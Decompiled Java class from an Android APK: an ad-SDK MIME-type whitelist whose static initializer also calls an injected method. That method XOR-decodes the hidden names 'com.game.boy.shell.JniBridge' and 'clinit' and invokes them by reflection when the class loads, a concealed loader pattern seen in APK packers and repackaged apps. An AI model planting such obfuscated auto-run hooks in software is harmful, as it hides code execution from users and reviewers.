package com.kwad.sdk.core.webview.b.c;

import com.baidu.mobads.sdk.internal.an;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public final class c {
    private static final List<String> aSC;

    static {
        ArrayList arrayList = new ArrayList();
        aSC = arrayList;
        arrayList.add("application/x-javascript");
        arrayList.add("image/jpeg");
        arrayList.add("image/tiff");
        arrayList.add("text/css");
        arrayList.add("text/html");
        arrayList.add("image/gif");
        arrayList.add("image/png");
        arrayList.add("application/javascript");
        arrayList.add("video/mp4");
        arrayList.add("audio/mpeg");
        arrayList.add(an.d);
        arrayList.add("image/webp");
        arrayList.add("image/apng");
        arrayList.add("image/svg+xml");
        arrayList.add("application/octet-stream");
        houUl();
    }

    public static boolean fw(String str) {
        return aSC.contains(str);
    }

    private static /* synthetic */ void houUl() {
        char[] charArray = "\u009f\u0093\u0091Ò\u009b\u009d\u0091\u0099Ò\u009e\u0093\u0085Ò\u008f\u0094\u0099\u0090\u0090Ò¶\u0092\u0095¾\u008e\u0095\u0098\u009b\u0099".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 252);
        }
        String str = new String(charArray);
        char[] charArray2 = "\u009f\u0090\u0095\u0092\u0095\u0088".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 252);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
